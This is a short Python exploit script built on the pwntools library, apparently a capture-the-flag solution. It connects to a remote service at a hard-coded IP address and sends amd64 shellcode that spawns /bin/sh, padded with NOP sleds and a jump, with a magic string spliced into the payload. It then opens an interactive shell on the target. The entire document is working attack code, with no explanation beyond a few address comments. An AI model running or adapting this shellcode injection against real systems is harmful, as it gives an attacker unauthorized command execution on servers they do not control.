from pwn import *

server = remote('60.250.197.227', 10001)
context(arch = 'amd64', os = 'linux')

print(server.recvuntil('name?')) # 0x00601100
server.send('hello') 

print(server.recvuntil('yours?')) # 0x006010a0

payload = ''
payload += asm('''
  jnz sc
  {0}
sc:
  {1}
  {2}
  '''.format('nop\n'*34, shellcraft.amd64.linux.sh(), 'nop\n'*34))

payload = payload[:2] + 'wubbalubbadubdub' + payload[2:]
print(payload)
server.send(payload)

server.interactive()
